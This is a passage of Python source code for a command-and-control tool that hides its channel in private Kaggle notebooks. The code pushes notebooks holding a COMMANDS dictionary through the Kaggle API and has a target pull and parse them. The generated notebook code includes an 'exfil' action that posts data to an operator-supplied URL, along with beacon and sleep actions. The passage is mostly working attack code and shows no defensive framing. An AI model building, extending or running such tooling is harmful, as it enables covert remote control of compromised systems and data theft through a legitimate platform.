            "print(f'[C2] Action: {action}')",
            "",
            "if action == 'collect_metrics':",
            "    metrics = {'cpu': 45, 'memory': 60, 'time': time.time()}",
            "    print(json.dumps(metrics))",
            "",
            "elif action == 'exfil':",
            "    url = COMMANDS.get('exfil_url')",
            "    if url:",
            "        data = {'status': 'alive', 'timestamp': time.time()}",
            "        try:",
            "            req = urllib.request.Request(url, data=json.dumps(data).encode())",
            "            urllib.request.urlopen(req, timeout=10)",
            "        except: pass",
            "",
            "elif action == 'sleep':",
            "    interval = COMMANDS.get('interval', 60)",
            "    time.sleep(interval)",
        ]
        
        notebook_content = create_notebook_content(code_cells)
        
        # Push updated kernel (no newTitle to avoid 409 conflict)
        push_result = push_kernel_via_api(
            username=username,
            api_key=api_key,
            kernel_slug=kernel_slug,
            title=None,  # Don't set title for existing kernels
            notebook_content=notebook_content,
            is_private=True,
            enable_internet=True,
            log_fn=log_fn
        )
        
        if push_result["success"]:
            result["success"] = True
            result["version"] = push_result.get("version")
            log_fn(f"[C2] ✓ Commands updated: {commands}")
        else:
            result["error"] = push_result.get("error")
            log_fn(f"[C2] ✗ Update failed: {result['error']}")
    
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[C2] ✗ Exception: {e}")
    
    return result


def get_c2_commands(
    username: str,
    api_key: str,
    kernel_slug: str,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Get C2 commands from kernel source.
    
    Target uses this to read commands from kernel source.
    Works via kernels/pull API (200 OK).
    
    Args:
        username: Kaggle username
        api_key: Kaggle Legacy API key
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
        log_fn: Logging function
    
    Returns:
        dict with success, commands, error
    """
    if log_fn is None:
        log_fn = print
    
    result = {"success": False, "commands": None, "error": None}
    
    try:
        import base64
        import json
        import ast
        
        auth_str = base64.b64encode(f"{username}:{api_key}".encode()).decode()
        
        # Parse kernel slug
        parts = kernel_slug.split('/')
        if len(parts) == 2:
            kernel_user, kernel_name = parts
        else:
            kernel_user = username
            kernel_name = kernel_slug
        
        # Get kernel source via pull API
        resp = requests.get(
            "https://www.kaggle.com/api/v1/kernels/pull",
            headers={"Authorization": f"Basic {auth_str}"},
            params={"userName": kernel_user, "kernelSlug": kernel_name},
            timeout=30
        )
        
        if resp.status_code == 200:
            data = resp.json()
            source_b64 = data.get("blob", {}).get("source", "")
            
            if source_b64:
                source = base64.b64decode(source_b64).decode()
                
                # Parse as notebook JSON
                try:
                    nb = json.loads(source)
                    for cell in nb.get("cells", []):
                        src = cell.get("source", [])
                        if isinstance(src, list):
                            src = "".join(src)
                        
                        # Look for COMMANDS = {...} pattern
                        if "COMMANDS" in src and "=" in src:
                            # Extract the dict using ast.literal_eval
                            start = src.find("{")
                            end = src.rfind("}") + 1
                            if start >= 0 and end > start:
                                dict_str = src[start:end]
                                try:
                                    commands = ast.literal_eval(dict_str)
                                    if isinstance(commands, dict):
                                        result["success"] = True
                                        result["commands"] = commands
                                        log_fn(f"[C2] ✓ Commands retrieved: {commands}")
                                        return result
                                except (ValueError, SyntaxError):
                                    continue
                    
                    result["error"] = "No COMMANDS dict found in source"
                    log_fn(f"[C2] ⚠ No commands in kernel")
                    
                except json.JSONDecodeError:
                    result["error"] = "Failed to parse notebook JSON"
                    log_fn(f"[C2] ✗ Notebook parse error")
        else:
            result["error"] = f"HTTP {resp.status_code}"
            log_fn(f"[C2] ✗ Pull failed: {result['error']}")
    
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[C2] ✗ Exception: {e}")
    
    return result


def create_notebook_content(
    code_cells: List[str],
    markdown_cells: List[str] = None,
) -> str:
    """Create base64-encoded notebook content.
    
    Args:
        code_cells: List of code strings
        markdown_cells: List of markdown strings
    
    Returns:
        Base64-encoded notebook JSON
    """
    import base64
    
    cells = []
    
    for code in code_cells:
        cells.append({
            "cell_type": "code",
            "source": code.split("\n") if "\n" in code else [code],
            "metadata": {},
            "execution_count": None,
            "outputs": []
        })
    
    if markdown_cells:
        for md in markdown_cells:
            cells.append({
                "cell_type": "markdown",
                "source": md.split("\n") if "\n" in md else [md],
                "metadata": {}
            })
    
    notebook = {
        "cells": cells,
        "metadata": {
            "kernelspec": {
                "display_name": "Python 3",
                "language": "python",
                "name": "python3"
            }
        },
        "nbformat": 4,
        "nbformat_minor": 4
    }
    
    return base64.b64encode(json.dumps(notebook).encode()).decode()
